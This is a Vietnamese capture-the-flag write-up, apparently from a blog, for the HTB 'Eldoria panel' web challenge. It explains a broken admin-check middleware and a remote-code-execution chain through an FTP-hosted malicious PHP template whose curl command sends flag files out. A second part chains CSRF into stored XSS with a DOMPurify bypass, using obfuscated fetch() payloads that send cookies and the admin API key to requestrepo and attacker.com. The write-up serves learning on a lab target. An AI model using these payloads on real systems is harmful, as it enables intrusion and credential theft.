---
layout: single
title: "Eldoria panel"
date: 2025-03-31 13:50:55 +0700
categories: [Cyber-Apocalypse-CTF-2025]
tags: [CTF, Web]
---
# [web] Eldoria panel - web - medium
>Author: Taneora
- Tên: Eldoria panel
- Description: A development instance of a panel related to the Eldoria simulation was found. Try to infiltrate it to reveal Malakar's secrets.
- *Có source code*
----

## Phân tích

Trang web có 4 chức năng chính:

1. Đăng ký, đăng nhập
2. Xem nhiệm vụ
3. Nhận nhiệm vụ
4. Đăng trạng thái cá nhân

---


Khi phân tích source code, ta phát hiện hàm `middleware` để check admin rất ... :

```php 
$adminApiKeyMiddleware = function (Request $request, $handler) use ($app) {
	if (!isset($_SESSION['user'])) {
		$apiKey = $request->getHeaderLine('X-API-Key');
		if ($apiKey) {
			$pdo = $app->getContainer()->get('db');
			$stmt = $pdo->prepare("SELECT * FROM users WHERE api_key = ?");
			$stmt->execute([$apiKey]);
			$user = $stmt->fetch(PDO::FETCH_ASSOC);
			if ($user && $user['is_admin'] === 1) {
				$_SESSION['user'] = [
					'id'              => $user['id'],
					'username'        => $user['username'],
					'is_admin'        => $user['is_admin'],
					'api_key'         => $user['api_key'],
					'level'           => 1,
					'rank'            => 'NOVICE',
					'magicPower'      => 50,
					'questsCompleted' => 0,
					'artifacts'       => ["Ancient Scroll of Wisdom", "Dragon's Heart Shard"]
				];
			}
		}
	}
	return $handler->handle($request);
};
```
Nghĩa là khi không có `$_SESSION['user']` thì mới check xem có phải admin không,còn có `$_SESSION['user']` thì không check gì cả =))) .
-> Có thể thoải mái dùng các chức năng của admin.

**Tại endpoint `POST /api/admin/appSettings`:**

```php
$app->post('/api/claimQuest', function (Request $request, Response $response, $args) {
	$data = json_decode($request->getBody()->getContents(), true);

	[...]

	if (!empty($data['questUrl'])) {
        $validatedUrl = filter_var($data['questUrl'], FILTER_VALIDATE_URL);
        if ($validatedUrl === false) {
            error_log('Invalid questUrl provided: ' . $data['questUrl']);
        } else {
            $safeQuestUrl = escapeshellarg($validatedUrl);
            $cmd = "nohup python3 " . escapeshellarg(__DIR__ . "/bot/run_bot.py") . " " . $safeQuestUrl . " > /dev/null 2>&1 &";
            exec($cmd);
        }
    }
	
	return $response;
})->add($apiKeyMiddleware);
```
Có thể sửa các thuộc tính của server, trong đó có `$GLOBALS['settings']['templatesPath'] ` để khai thác `LFI` thông qua protocol `ftp://` .


## Khai thác

Protocol `ftp://` có thể bypass được hàm `file_exists()` nên ta có thể dựng một FTP server serve file PHP độc hại , sau đó thực hiện thay đổi thuộc tính `templatesPath` thành URL đến FTP server.

Tạo file chứa mã PHP độc hại (lưu ý đặt tên file giống tên các templates trong src code, ví dụ dashboard.php).
```php
// dashboard.php
<?php
	system('curl -d `cat /flag* | base64` <webhook>');
?>
```
Hỏi chat GPT để dựng FTP server.

Thay đổi `templatesPath` thành URL đến FTP server:
[image](/images/eldoria-panel_01.png)

Truy cập `/dashboard` để trigger code PHP và nhận request ở `requestrepo` : 
[image](/images/eldoria-panel_02.png)


Nhận về flag:

```
echo "SFRCe2Y0azNfZmw0Z19mMHJfdDM1dDFuZ30=" | base64 -d
HTB{f4k3_fl4g_f0r_t35t1ng}
```

---

## P/S: CSRF -> XSS để lấy cookie Admin

### Phân tích
Khả năng cao việc hàm middleware check admin là bug ngoài ý muốn của author nên vẫn có cách khác để lấy được cookie của admin.

Phân tích endpoint `/api/updateStatus` : 
```php
// POST /api/updateStatus
$app->post('/api/updateStatus', function (Request $request, Response $response, $args) {
    $data = json_decode($request->getBody()->getContents(), true);  // (A)
    $newStatus = $data['status'] ?? '';
    if (!isset($_SESSION['user'])) {
        $result = ['status' => 'error', 'message' => 'Not authenticated'];
    } else {
        $_SESSION['user']['status'] = $newStatus;                    // (B)
        $pdo = $this->get('db');
        $stmt = $pdo->prepare("UPDATE users SET status = ? WHERE id = ?");
        $stmt->execute([$newStatus, $_SESSION['user']['id']]);
        $result = ['status' => 'updated', 'newStatus' => $newStatus];
    }
    $response->getBody()->write(json_encode($result));
    return $response->withHeader('Content-Type', 'application/json');
})->add($apiKeyMiddleware);
```

1. **CSRF**
Ở đây API này không kiểm tra `Content-Type` : 
`$data = json_decode($request->getBody()->getContents(), true);`
Dù yêu cầu body là JSON, nhưng attacker có thể gửi bằng form HTML với:
`enctype="text/plain"`
PHP vẫn xử lý `$_POST` như `JSON` → `JSON injection` giả mạo request.
2. **Stored XSS**
`$_SESSION['user']['status'] = $newStatus;`
Ở đây dữ liệu `status` do người dùng gửi vào được lưu vào session và DB mà không được lọc/escape, nghĩa là attacker có thể gửi `HTML/JS` → nó sẽ được lưu lại
3. **Con Bot "admin" chạy questUrl user cung cấp**
`$cmd = "nohup python3 run_bot.py " . escapeshellarg($questUrl) ...`
Người dùng có thể cung cấp questUrl, và bot sẽ mở URL đó bằng Selenium (Chrome headless)
-> CSRF -> XSS -> Lấy cookie:

### Exploit
***Bước 1: Host trang độc hại***
Host một trang HTML: 
```html
<form action="http://127.0.0.1:80/api/updateStatus" method="POST" enctype="text/plain">
  <input type="hidden" name='{{"status": "<XSS_PAYLOAD>","foo' value='":"bar"}}'>
</form>
<script>document.forms[0].submit();</script>
```
→ Khi bot truy cập trang này, nó gửi 1 JSON lỗi định dạng, nhưng PHP vẫn parse được → thay đổi status của admin → Stored XSS.

***Bước 2: Stored XSS thực thi khi admin truy cập trang***
Dùng `DOMPurify bypass` + `JSON escaping` (Đọc thêm tại [đây](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes) ):
Payload JS gốc:
```js 
fetch('https://7oih7imb.requestrepo.com/?c=' + encodeURIComponent(document.cookie))
```
Encode thành `String.fromCharCode`:
```js
eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,55,111,105,104,55,105,109,98,46,114,101,113,117,101,115,116,114,101,112,111,46,99,111,109,47,63,99,61,39,43,101,110,99,111,100,101,85,82,73,67,111,109,112,111,110,101,110,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,41))
```
Payload hoàn chỉnh:
```html 
<form id=\\"x \\"><svg><style><a id=\\"</style><img src=x onerror=eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,55,111,105,104,55,105,109,98,46,114,101,113,117,101,115,116,114,101,112,111,46,99,111,109,47,63,99,61,39,43,101,110,99,111,100,101,85,82,73,67,111,109,112,111,110,101,110,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,41))>\\"></a></style></svg></form><input form=\\"x\\" name=\\"namespaceURI\\">
```

***Bước 3: XSS lấy API Key admin***
Payload thực thi JS trong trình duyệt admin:
```js 
fetch('/api/user')
  .then(r => r.json())
  .then(d => fetch('https://attacker.com/log?key=' + d.api_key))
```
Kết quả cuối:

Admin login → bị inject JS → leak API key
Attacker lấy được quyền admin full access